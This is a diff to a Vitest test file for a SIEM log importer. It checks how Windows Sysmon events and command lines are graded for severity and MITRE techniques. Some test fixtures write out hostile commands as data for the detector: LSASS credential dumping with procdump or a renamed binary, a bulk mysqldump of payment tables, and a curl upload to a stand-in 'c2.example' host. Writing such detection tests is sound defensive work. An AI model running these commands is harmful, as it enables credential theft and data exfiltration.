@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { parseSiemExport, extractRecords } from "../../src/analysis/siemImport.js";
+import { parseSiemExport, extractRecords, isSuspiciousCmd } from "../../src/analysis/siemImport.js";
 
 // ── Representative Windows Event Log records (Elastic _source shape) ─────────────
 const LOGON_4624 = {
@@ -149,6 +149,24 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
     expect(byTarget["explorer.exe"]).toBe("High");  // unknown source → still flagged
   });
 
+  it("downgrades benign Defender CreateRemoteThread (EID 8) to Low and drops T1055, but flags a masquerade", () => {
+    const defender = {
+      "@timestamp": "2024-03-18T11:00:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
+      event_id: 8, event_data: { SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe", TargetImage: "C:\\Windows\\explorer.exe" },
+    };
+    const masq = {
+      "@timestamp": "2024-03-18T11:01:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
+      event_id: 8, event_data: { SourceImage: "C:\\Users\\Public\\svchost.exe", TargetImage: "C:\\Windows\\explorer.exe" },
+    };
+    const r = parseSiemExport(elastic(defender, masq));
+    const def = r.events.find((e) => e.description.includes("MsMpEng.exe"))!;
+    const mq = r.events.find((e) => e.description.includes("Public\\svchost.exe"))!;
+    expect(def.severity).toBe("Low");
+    expect(def.mitreTechniques).not.toContain("T1055");
+    expect(mq.severity).toBe("High");   // masqueraded name from \Users\Public\
+    expect(mq.mitreTechniques).toContain("T1055");
+  });
+
   it("flags LSASS process-access (Sysmon EID 10) as High with credential-dumping MITRE", () => {
     const lsass = {
       "@timestamp": "2017-03-20T10:02:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
@@ -157,6 +175,79 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
     const r = parseSiemExport(elastic(lsass));
     expect(r.events[0].severity).toBe("High");
     expect(r.events[0].mitreTechniques).toContain("T1003.001");
+  });
+
+  it("downgrades benign LSASS access from Defender / core-OS processes to Low — #198", () => {
+    const defender = {
+      "@timestamp": "2024-03-18T10:00:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
+      event_id: 10, event_data: { SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2\\MsMpEng.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1410" },
+    };
+    const svchost = {
+      "@timestamp": "2024-03-18T10:01:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
+      event_id: 10, event_data: { SourceImage: "C:\\Windows\\System32\\svchost.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1010" },
+    };
+    const r = parseSiemExport(elastic(defender, svchost));
+    for (const e of r.events) {
+      expect(e.severity).toBe("Low");
+      expect(e.mitreTechniques).not.toContain("T1003.001");
+    }
+  });
+
+  it("still flags a MASQUERADED benign name running LSASS access from a suspicious path as High — #198", () => {
+    const masq = {
+      "@timestamp": "2024-03-18T10:02:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
+      event_id: 10, event_data: { SourceImage: "C:\\Users\\Public\\svchost.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1410" },
+    };
+    const r = parseSiemExport(elastic(masq));
+    expect(r.events[0].severity).toBe("High");
+    expect(r.events[0].mitreTechniques).toContain("T1003.001");
+  });
+
+  it("grades a renamed LSASS dumper (by argument) as High — #199", () => {
+    const dump = {
+      "@timestamp": "2024-03-18T15:24:38Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS-DEV-01",
+      event_id: 1, event_data: { Image: "C:\\Windows\\Temp\\wdi-svc.exe", CommandLine: "wdi-svc.exe -p lsass -o C:\\Windows\\Temp\\lsa.dmp", ParentImage: "C:\\Windows\\explorer.exe" },
+    };
+    const r = parseSiemExport(elastic(dump));
+    expect(r.events[0].severity).toBe("High");
+    expect(r.events[0].mitreTechniques).toContain("T1003");
+  });
+
+  it("bumps execution from a user-writable path (AppData) above benign Low — #199", () => {
+    const dropper = {
+      "@timestamp": "2024-03-18T14:17:07Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS-DEV-01",
+      event_id: 1, event_data: { Image: "C:\\Users\\marcus.chen\\AppData\\Roaming\\Microsoft\\Libs\\brsvc.exe", CommandLine: "brsvc.exe --svc", ParentImage: "C:\\Users\\marcus.chen\\Downloads\\BrowserPlugin_v3.1.exe" },
+    };
+    const r = parseSiemExport(elastic(dropper));
+    expect(r.events[0].severity).toBe("Medium");
+  });
+
+  it("does NOT over-grade a benign system-path recon command — #199", () => {
+    const recon = {
+      "@timestamp": "2024-03-18T14:24:38Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS-DEV-01",
+      event_id: 1, event_data: { Image: "C:\\Windows\\System32\\whoami.exe", CommandLine: "whoami /all", ParentImage: "C:\\Windows\\System32\\cmd.exe" },
+    };
+    const r = parseSiemExport(elastic(recon));
+    expect(["Info", "Low"]).toContain(r.events[0].severity);
+  });
+});
+
+describe("isSuspiciousCmd — #199 tradecraft grading", () => {
+  it("strong: a renamed LSASS dumper identified by its arguments", () => {
+    expect(isSuspiciousCmd("C:\\Windows\\Temp\\wdi-svc.exe", "wdi-svc.exe -p lsass -o C:\\Windows\\Temp\\lsa.dmp")).toBe("strong");
+    expect(isSuspiciousCmd("x.exe", "procdump64.exe -ma lsass.exe out.dmp")).toBe("strong");
+  });
+  it("weak: execution from a user-writable / staging path", () => {
+    expect(isSuspiciousCmd("C:\\Users\\m\\AppData\\Roaming\\x.exe", "x.exe --svc")).toBe("weak");
+    expect(isSuspiciousCmd("/tmp/payload", "/tmp/payload")).toBe("weak");
+  });
+  it("weak: bulk DB dump + curl file upload (collection / exfil)", () => {
+    expect(isSuspiciousCmd("/usr/bin/mysqldump", "mysqldump -u app -psecret prod customers payment_methods")).toBe("weak");
+    expect(isSuspiciousCmd("/usr/bin/curl", "curl -X POST https://c2.example/api -F data=@/tmp/x.gz")).toBe("weak");
+  });
+  it("null: benign system binary running a benign command", () => {
+    expect(isSuspiciousCmd("C:\\Windows\\System32\\whoami.exe", "whoami /all")).toBe(null);
+    expect(isSuspiciousCmd("/usr/bin/id", "id")).toBe(null);
   });
 });
 
